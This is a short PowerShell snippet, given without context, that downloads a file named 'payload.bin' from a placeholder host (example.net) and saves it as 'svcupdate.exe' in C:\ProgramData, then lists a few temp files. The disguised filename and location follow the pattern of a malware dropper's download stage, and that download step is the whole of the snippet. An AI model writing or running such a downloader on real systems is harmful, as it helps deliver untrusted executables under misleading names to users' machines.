
try { $PayloadUrl = 'http://example.net/downloads/payload.bin'; $LocalPath = "C:\ProgramData\svcupdate.exe"; (New-Object System.Net.WebClient).DownloadFile($PayloadUrl, $LocalPath); Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3 } catch { Write-Warning "Remote fetch failed" }
